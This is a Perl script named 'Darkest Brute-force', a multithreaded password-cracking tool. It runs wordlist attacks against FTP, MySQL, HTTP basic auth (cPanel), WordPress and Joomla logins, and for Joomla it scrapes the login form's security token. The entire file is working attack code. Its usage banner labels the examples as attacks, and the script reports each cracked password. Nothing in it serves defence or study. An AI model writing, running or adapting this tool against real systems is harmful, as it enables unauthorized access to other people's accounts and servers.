#!/usr/bin/env perl

# Coder: MasTeRcHo


use strict;
use warnings;
use threads;
use Net::FTP;
use DBI;
use LWP;
use DBD::mysql;
use Getopt::Long;
use threads::shared;
use WWW::Mechanize;
use Term::ANSIColor qw(:constants);


sub banner {
	print '
	'.GREEN.'[+]'.RESET.' Darkest Brute-force By MaStErCHhO v1.3

	'.BOLD BLUE.'[*]'.RESET.' Options:

		-u | --user => name of user 		[example: admin]
		-h | --host => Target			[example: 127.0.0.1]
		-w | --wordlist => Wordlist		[example: /tmp/wordlist.txt]
		-t | --threads => number of threads	[example: 10]
		-m | --module => module name

	'.GREEN.'[+]'.RESET.' list of modules:

		'.BOLD BLUE.'[*]'.RESET.' ftp
		'.BOLD BLUE.'[*]'.RESET.' wordpress
		'.BOLD BLUE.'[*]'.RESET.' joomla
		'.BOLD BLUE.'[*]'.RESET.' authbasic -> used by cpanel and protected diretories (htaccess)
		'.BOLD BLUE.'[*]'.RESET.' mysql

	'.GREEN.'[+]'.RESET.' Examples of use:

	$ ./dark.pl -u admin -h 127.0.01 -w wl.txt -t 50 -m ftp				| FTP-ATTACK
	$ ./dark.pl -u admin -h localhost/wp-login.php -w wl.txt -t 100 -m wordpress 	| WP-ATTACK
	$ ./dark.pl -u admin -h localhost/administrator/ -w wl.txt -t 100 -m joomla	| JOOMLA-ATTACK
	$ ./dark.pl -u admin -h localhost:2082 -w wl.txt -t 100 -m authbasic		| CPANEL-ATTACK
	$ ./dark.pl -u admin -h localhost -w wl.txt -t 100 -m mysql			| MYSQL-ATTACK

';
	exit(1);
}

my($wordlist,$thr,$ini,$fin,@threads,$arq,$i,@a,$test);
our($user,$host,@aa,$type,$token);

GetOptions(	'u|user=s'  => \$user,
		'h|host=s' => \$host,
		'w|wordlist=s' => \$wordlist,
		'm|module=s' => \$type,
		't|threads=i' => \$thr
) || die &banner;

if(defined($type)){
	foreach('ftp','wordpress','joomla','authbasic','mysql'){
		if($type eq $_){
			$type = \&$type;
			$test = 1;
			last;
		}
	}
	
	if(!defined($test)){
		&banner;
	}
	
} else {
	&banner;
}

&banner if (!defined($user)) || (!defined($host)) || (!defined($wordlist)) || (!defined($thr));

open($arq,"<$wordlist") || die($!);
@a = <$arq>;
close($arq);
@aa = grep { !/^$/ } @a;

print "\n".GREEN.'[+]'.RESET." Starting Attack";
print "\n".GREEN.'[+]'.RESET." Host => $host";
print "\n".GREEN.'[+]'.RESET." User => $user";
print "\n".GREEN.'[+]'.RESET." Wordlist => $wordlist";
print "\n".GREEN.'[+]'.RESET." Threads => $thr\n\n";

my $stop :shared = 0;

$ini = 0;
$fin = $thr - 1;

while(1){

	@threads = ();

	for($i=$ini;$i<=$fin;$i++){
		push(@threads,$i);
	}

	foreach(@threads){
		$_ = threads->create(\&brute);
	}

	foreach(@threads){
		$_->join();
	}

	die("\n\n".GREEN."[+]".RESET." 100% complete\n\n") if $stop;

	for($i=$ini;$i<=$fin;$i++){
		print BOLD RED.'[-]'.RESET." Trying => $aa[$i]";
	}

	$ini = $fin + 1;
	$fin = $fin + $thr;

}

sub brute {

	my $id = threads->tid();
	threads->exit() if $stop;
	$id--;
	if(defined($aa[$id])){
		&$type($aa[$id]);
	} else {
		$stop = 1;
	}
}

sub ftp {
	my($pass) = @_;
	chomp($pass);
	
	my $f = Net::FTP->new($host) || die($!);

	if($f->login($user, $pass)){
		$f->quit;
		print "\n\n\t".GREEN.'[+]'.RESET." PASSWORD CRACKED: $pass\n";
		$stop = 1;
	} else {
		$f->quit;
		return;
	}
}

sub mysql {
	my($pass) = @_;
	chomp($pass);
	my $dsn = "dbi:mysql::$host:3306";
	my $DBIconnect = DBI->connect($dsn, $user, $pass,{
		PrintError => 0,
		RaiseError => 0
	});
	if(!$DBIconnect){
		return;
	} else {
		print "\n\n\t".GREEN.'[+]'.RESET." PASSWORD CRACKED: $pass\n";
		$stop = 1;
	}
}

sub authbasic {
	my($pass) = @_;
	chomp($pass);

	if($host !~ /^(http|https):\/\//){
		$host = 'http://'.$host;
	}
	my $ua = LWP::UserAgent->new;
	my $req = HTTP::Request->new(GET => $host);
	$req->authorization_basic($user, $_);
	if($ua->request($req)->code == 401){
		return;
	} else {
		print "\n\n\t".GREEN.'[+]'.RESET." PASSWORD CRACKED: $pass\n";
		$stop = 1;
	}
}

sub wordpress {
	my($pass) = @_;
	chomp($pass);

	my $ua = new LWP::UserAgent;
	if ($host !~ /^(http|https):\/\//){
		$host = 'http://' . $host;
	}

        my $response = $ua->post($host,{
			'log' => $user,
			'pwd' => $pass,
			'wp-submit' => 'Log in',
	});
	my $code = $response->code;
	if($code =~ /302/){
		print "\n\n\t".GREEN.'[+]'.RESET." PASSWORD CRACKED: $pass\n";
		$stop = 1;
	} else {
		return;
	}
}

sub joomla {
	my($pass) = @_;
	chomp($pass);
	
	if ($host !~ /^(http|https):\/\//){
		$host = 'http://' . $host;
	}

	my $mech = WWW::Mechanize->new();
	$mech->get($host);
	if($mech->content() =~ /([0-9a-fA-F]{32})/){
		$token = $1;
	} else {
		die("\n[-] Error to get security token\n");
	}

	$mech->submit_form( 
		fields => { 
			username => $user,
			passwd  => $pass,
			task  => 'login',
			$token  => '1',
		}
	);
 
	if($mech->content() !~ /com_categories/i){ 
		return; 
	} else {
		print "\n\n\t".GREEN.'[+]'.RESET." PASSWORD CRACKED: $pass\n";
		$stop = 1; 
	} 
}
